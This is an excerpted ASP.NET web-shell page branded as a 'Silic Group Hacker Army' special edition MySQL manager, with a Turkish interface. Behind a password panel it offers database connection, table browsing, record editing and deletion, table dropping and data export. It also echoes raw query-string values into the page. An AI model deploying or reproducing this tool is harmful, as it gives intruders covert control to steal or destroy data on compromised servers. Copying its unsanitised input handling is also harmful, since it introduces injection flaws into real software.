...
<head id="Head1" runat="server">
    <title>MYSQL Yönetici -Asp.net Silic Group Hacker Army Özel Sürüm</title>
    <style type="text/css">
...
<script runat="server">
    ...
    private bool OpenData()
    {
        ...
        if (connString != string.Empty && DBConn.State != ConnectionState.Open)
        {
            ...
            {
                Response.Write("Veritabanı bağlantısı başarısız, lütfen bağlantı dizesini (connection string) kontrol edin!" + ex.Message);
                return false;
            }
            return true;
        }
    ...
    private DataTable RunTable(string sqlstr)
    {
        ...
        {
            Response.Write("SQL Hatası oluştu：" + ex.Message + "<br>SQL:" + sqlstr);
            Response.End();
        }
        finally
        {
    ...
    private void ShowDBs()
    {
        ...
        ListItem item = new ListItem("Veritabanı seç", "");
    ...
    <form id="form1" runat="server">
        <div>
            <asp:Panel ID="PanelLogin" runat="server" Visible="false"  DefaultButton="btnLogin">
             <h2>
                    MYSQL Yönetici ( Silic Group Hacker Army ) &raquo;</h2>
                <span style="font: 11px Verdana;">Parola: </span>
                <input name="password" type="password" size="20" id="txtpassword" runat="server">&nbsp;
                <asp:Button ID="btnLogin" runat="server" Text="Oturum aç" OnClick="btnLogin_Click" />&nbsp;
            </asp:Panel>
            ...
            <asp:Panel ID="PanFrm" runat="server" Visible="false">
                ...
                <p>
                    ...
                    <input class="bt" name="connect" id="connect" value="Bağlan" type="submit" size="100"
                ...
                <asp:ListItem Text="Bir veritabanı seçin"></asp:ListItem>
                </asp:DropDownList>
                </p>
            </asp:Panel>
            <div>
              ...
              { %>
                ...
                | <a href="?action=structure&tblname=<%=Request.QueryString["tblname"] %>">Oluştur</a>
                | <a href="?action=droptable&tblname=<%=Request.QueryString["tblname"] %>" onclick="return confirm('“<%=Request.QueryString["tblname"] %>” adlı tablo silinecek onaylıyor musunuz?')">
                    Tabloyu sil</a> ]
                <%
                    } %>
            </div>
            ...
            Veritabanı şu şekilde dışa aktarıldı: <asp:Label ID="lblExport" runat="server">
            </asp:Label>
            ...
            <asp:Panel ID="PanTables" runat="server" Visible="false" EnableViewState="false">
                <table border="0" cellpadding="0" cellspacing="0" width="99%" align="center">
                    ...
                    <input type="checkbox" name="tables" value="<%= tblsDt.Rows[i]["Name"]%>" />
                        ...
                        <td>
                            <a href="?action=show&tblname=<%= tblsDt.Rows[i]["Name"]%>">
                                ...
                                Oluştur</a> | <a href="?action=droptable&tblname=<%= tblsDt.Rows[i]["Name"]%>" onclick="return confirm('确定删除表“<%= tblsDt.Rows[i]["Name"]%>”？')">
                                    Sil</a> ]
                        </td>
                        <td>
                            <%= tblsDt.Rows[i]["Rows"]%>
                    ...
                    <td colspan="6">
                        ...
                        <input class="bt" type="submit" name="downrar" value="Seçili tabloyu dışa aktar" id="btnExport" runat="server" onserverclick="btnExport_ServerClick" />
                    </td>
                    </tr>
                </table>
            </asp:Panel>
                    ...
                    <tr class="alt<%=i%2==0?"1":"2" %>" onmouseover="this.className='focus';" onmouseout="this.className='alt<%=i%2==0?"1":"2" %>';">
                        <td nowrap>
                            ...
                            <a href="?action=edit&tblname=<%=Request.QueryString["tblname"] %>&pk=<%=tblPkName %>&v=<%=dData.Rows[i][tblPkName] %>">
                                Düzenle</a> | <a href="?action=deldata&tblname=<%=Request.QueryString["tblname"] %>&pk=<%=tblPkName %>&v=<%=dData.Rows[i][tblPkName] %>"
                                    onclick="return confirm('Bu kayıt silinecek. Onaylıyor musunuz?')">Sil</a>
                            <%
                                } %>
                        </td>
                        <%
            ...
            <asp:Panel ID="PanelEdit" runat="server" Visible="false" EnableViewState="false">
                <h2>
                    <%=Request.QueryString["tblname"].Trim() %> tablosundaki kayıtları düzenle &raquo;</h2>
                <table border="0" cellpadding="3" cellspacing="0">
                    <%
                        DataTable dColumn = TableColumn(Request.QueryString["tblname"].ToString().Trim());
                    ...
                    <tr class="alt2">
                        <td colspan="2">
                            <input class="bt" type="submit" name="update" value="Güncelle" id="Submit2" runat="server"
            ...
            <asp:Panel ID="PanelInsert" runat="server" Visible="false" EnableViewState="false">
                <h2>
                    <%=Request.QueryString["tblname"].Trim() %> tablosuna kayıt ekle &raquo;</h2>
                <table border="0" cellpadding="3" cellspacing="0">
                    <%
                        DataTable dColumn = TableColumn(Request.QueryString["tblname"].ToString().Trim());
            ...
            <asp:Panel ID="PanelStructure" runat="server" Visible="false" EnableViewState="false">
                <h2>
                    <%=Request.QueryString["tblname"].Trim() %> tablosunu oluştur &raquo;</h2>
                <table border="0" cellpadding="3" cellspacing="0">
                    <tr class="head">
                        <td>
                            Field</td>
